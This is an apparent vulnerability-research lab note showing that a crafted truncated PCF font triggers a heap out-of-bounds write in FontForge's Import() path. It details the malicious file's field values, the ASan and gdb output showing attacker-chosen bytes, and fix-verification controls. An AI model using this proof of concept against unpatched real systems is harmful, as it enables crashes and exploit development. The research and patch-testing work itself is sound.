# REACHABILITY — real FontForge 20251009 Import() path (2026-11-24 06:3xZ)

Real headless build, real PCF file, real scripting `Import()` consumer. This
extends the witness-established rungs 1-4 from the direct-call harness to the
actual parser path; it is still not a pointer/IP or command primitive.

## Provisioning and build

- Source tarball `src/fontforge-20251009.tar.gz`, sha256
  `613424039e0e1b6bb106f8f0df287e1d249ac285d854f4e1964d68e9b9ad7eb0`
  (GitHub tag `20251009`; fetch only, no external probes).
- Fixed tree `src/fontforge-fixed` is a copy with the pinned patch applied:
  `patch -p1 < ../../pinned/fix-65e80b5.patch` succeeds at :1747 with
  offset -13; the changed line :1750 is `glyph>=0 && glyph!=0xffff && ...`.
- Both builds: cmake `-DCMAKE_BUILD_TYPE=Debug -DENABLE_GUI=OFF
  -DENABLE_SANITIZER=address -DENABLE_NATIVE_SCRIPTING=ON
  -DENABLE_PYTHON_SCRIPTING=OFF -DENABLE_PYTHON_EXTENSION=OFF
  -DENABLE_DOCS=OFF -DBUILD_SHARED_LIBS=OFF`, optional image/spiro/harfbuzz
  deps OFF; target `fontforgeexe` in `build-asan/` and `build-fixed/`.
  Binaries and build trees are untracked lab artifacts.

## Inputs

- `truncated.pcf` (296 bytes, sha256
  `0c8dc0fe33eafe6fe631716771eb16f7447070a3f22c8480c54c44559d528703`):
  PCF magic `\x01fcp`, four TOC tables (PROPERTIES, METRICS, BITMAPS,
  BDF_ENCODINGS), four 8x8 glyphs, and a 20-byte BDF_ENCODINGS table at
  offset 276 ending exactly at EOF: format 0, `min2=max2=0x5346`,
  `min1=0x4d`, `max1=0x50`, def 0, glyph indices 0,1,2. The fourth
  `getformint16()` reads EOF twice and yields `glyph == -1`.
- `complete.pcf` (298 bytes, sha256
  `149f03de680225a482172484235d80fc19dc908b12668cca194c48ec8eaa1526`)
  adds a fourth in-range glyph index 3.
- Scripts `import-pcf.ff` / `import-complete.ff`: `New()` then
  `Import("<absolute path>")`.

## Measured results

`ASAN_OPTIONS=detect_leaks=0 ./build-asan/bin/fontforge -script import-pcf.ff`
exits 1 with one ASan report (`real-import-asan.out`, sha256
`8c199e9e1299dd628a004cff7df50085eca2ca8c1b01a9b12b96831d115e0f8c`):

    ERROR: AddressSanitizer: heap-buffer-overflow
    WRITE of size 4 ... 4 bytes before a 16-byte region
    #0 PcfReadEncodingsNames fvimportbdf.c:1751
    #1 PcfParse fvimportbdf.c:1831
    #2 SFImportBDF fvimportbdf.c:2164
    #3 _SFImportBDF fvimportbdf.c:2226
    #4 FVImportBDF fvimportbdf.c:2329
    #5 bImport scripting.c:2306
    ...
    allocated by PcfReadEncodingsNames fvimportbdf.c:1726

Controls, both zero ASan reports and exit 0:

- `./build-fixed/bin/fontforge -script import-pcf.ff` — same truncated file,
  patched source: `real-import-fixed.out` (sha256
  `48d87e242e1aa8d623ef3b066ee056756d49b9dc249516bb6d16130cf43c93c5`).
- `./build-asan/bin/fontforge -script import-complete.ff` — vulnerable
  source, complete table: `real-import-safe.out` (sha256
  `c1ac99c903a1e4e484f2ef236806c40c58c60da4381acf95bb53c04673a19fe5`).

## W2 (2026-11-24 07:4xZ) — chosen bytes in the real process, plain abort

Two non-ASan Debug builds were configured from the same source trees with
`-DENABLE_SANITIZER=none` and all other flags as above: `build-plain/`
(vulnerable tag `20251009`) and `build-fixed-plain/` (`fontforge-fixed`).

- `gdb -batch -x gdb-real-plain.cmd ./build-plain/bin/fontforge` with a
  conditional breakpoint at `fvimportbdf.c:1751 if glyph < 0` and a
  hardware watchpoint on `*(int*)((char*)encs-4)`: at `glyph=-1, i=3,
  encs=0x555555c48240`, the watchpoint reported `Old value = 0`,
  `New value = 5458253` (`0x53494d`) at `encs-4 = 0x555555c4823c`, and
  `x/4xb &encs[-1]` read `4d 49 53 00` ("MIS\0"). The next four slots
  held `4d 46 53 00`, `4d 47 53 00`, `4d 48 53 00`, then
  `ff ff ff ff` from the original `memset(encs,-1,...)`. Transcript
  `gdb-real-plain.out` sha256
  `8d704e5dc5863d4fcf8307ca58953cc9800829dd1af5b52346291c178c835431`.
  Three bytes are attacker-chosen; the fourth is zero for these field
  values only (the pinned expression can set it with a larger `min2`/
  `tot`). This is the same offset and value as the direct-call gdb result,
  now measured inside the real FontForge process.
- Negative result preserved: the same conditional breakpoint on the ASan
  binary (`gdb-real-asan.out`, sha256
  `69a5d19112cba805417276b89d1f8507ed0ae0a0ec696d36db0511fa1a558e39`)
  reached `glyph=-1, i=3` and computed the RHS `0x53494d`, but gdb line
  stepping at the instrumented statement never exposed a post-write byte
  value; the plain-build watchpoint was used instead. No inference from
  that failed attempt beyond the values it printed.
- Plain (non-ASan) impact: vulnerable build on `truncated.pcf` exits 134
  with glibc `double free or corruption (out)` (`plain-real-import.out`,
  sha256 `3021d38c691f907118df42d436b614d4d63765e39ce5d928a85b7f79c2aec53f`);
  patched build on the same file exits 0
  (`plain-fixed-import.out`, sha256
  `60f02f9522adc006c7950b7770eb724d2a768c22cef2898eb44125bc18dae482`);
  vulnerable build on `complete.pcf` exits 0
  (`plain-complete-import.out`, sha256
  `ce8173e7f6298283725788d3131e4335f1f72a07a004c87158a2c00cd364eaaf`).
  Configure/build logs: `configure-plain.log`, `build-plain.log`,
  `configure-fixed-plain.log`, `build-fixed-plain.log`.

## Scope

Headless CLI scripting `Import()` on this host. Chosen bytes at the fixed
`encs[-1]` offset in the real process and plain-build abort are now
measured (W2 above). The GUI `Import()` menu, other loaders, pointer/IP
control, command execution, ASLR/grooming and independent witness replay
of this real-build path remain UNKNOWN.
